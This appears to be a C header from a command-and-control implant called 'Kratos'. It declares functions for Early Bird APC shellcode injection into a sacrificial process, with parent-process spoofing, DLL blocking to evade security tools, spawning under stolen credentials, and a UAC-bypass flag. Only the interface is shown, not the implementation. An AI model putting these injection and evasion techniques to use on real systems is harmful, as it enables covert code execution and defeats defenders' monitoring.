#ifndef KRATOS_INJECT_H
#define KRATOS_INJECT_H

#include <windows.h>

#if defined(INCLUDE_CMD_SPAWN) || defined(INCLUDE_CMD_SPAWNTO) || defined(INCLUDE_CMD_LIGOLO_START) || defined(INCLUDE_CMD_SPAWNAS) || defined(INCLUDE_CMD_EXECUTE_ASSEMBLY) || defined(INCLUDE_CMD_BLOCKDLLS)

/* Default sacrificial host process */
#define INJECT_DEFAULT_SPAWNTO "C:\\Windows\\System32\\notepad.exe"

/* Path of the sacrificial process. Updated by command_spawnto. */
extern char g_spawnto_path[512];

/* BlockDLLs state. Updated by command_blockdlls. Applied to all spawned processes. */
extern int g_blockdlls;

typedef struct {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD  pid;
    HANDLE hPipeRead; /* read end of anonymous pipe when capture_output=1, else NULL */
} EarlyBirdResult;

/*
 * Early Bird APC injection into g_spawnto_path.
 * Spawns suspended, PPID-spoofs to explorer.exe, applies BlockDLLs if g_blockdlls set.
 * cmdline_override: full lpCommandLine string. If NULL, uses g_spawnto_path.
 * capture_output: if 1, redirects stdout/stderr to an anonymous pipe; caller drains
 *   out->hPipeRead via read_pipe_output(out->hPipeRead, out->hProcess) then CloseHandle.
 * Returns 1 on success - caller owns out->hProcess, out->hThread, out->hPipeRead.
 * Returns 0 on failure - errmsg filled with reason.
 */
int earlybird_inject(const unsigned char *shellcode, size_t shellcode_len,
                     const char *cmdline_override,
                     int capture_output,
                     EarlyBirdResult *out, char *errmsg, size_t errmsg_len);

/*
 * Early Bird APC injection into g_spawnto_path, spawned under another user's credentials.
 * logon_type: 2=Interactive, 9=NewCredentials → CreateProcessWithLogonW.
 *             3=Network, 4=Batch, 5=Service, 8=NetworkCleartext → LogonUser + SetThreadToken.
 * domain: NetBIOS domain name. Pass NULL or empty to let Windows auto-resolve.
 * capture_output: if 1, redirects stdout/stderr to an anonymous pipe; caller drains
 *   out->hPipeRead via read_pipe_output(out->hPipeRead, out->hProcess) then CloseHandle.
 *   Types 3/4/5/8 also get PPID spoof (compatible with CreateProcessW).
 * Returns 1 on success - caller owns out->hProcess, out->hThread, out->hPipeRead.
 * Returns 0 on failure - errmsg filled with reason.
 */
int earlybird_inject_asuser(const unsigned char *shellcode, size_t shellcode_len,
                             const char *username, const char *domain, const char *password,
                             int logon_type, int bypass_uac, int capture_output,
                             EarlyBirdResult *out, char *errmsg, size_t errmsg_len);

#endif /* INCLUDE_CMD_SPAWN || ... || INCLUDE_CMD_EXECUTE_ASSEMBLY || INCLUDE_CMD_BLOCKDLLS */

#endif /* KRATOS_INJECT_H */
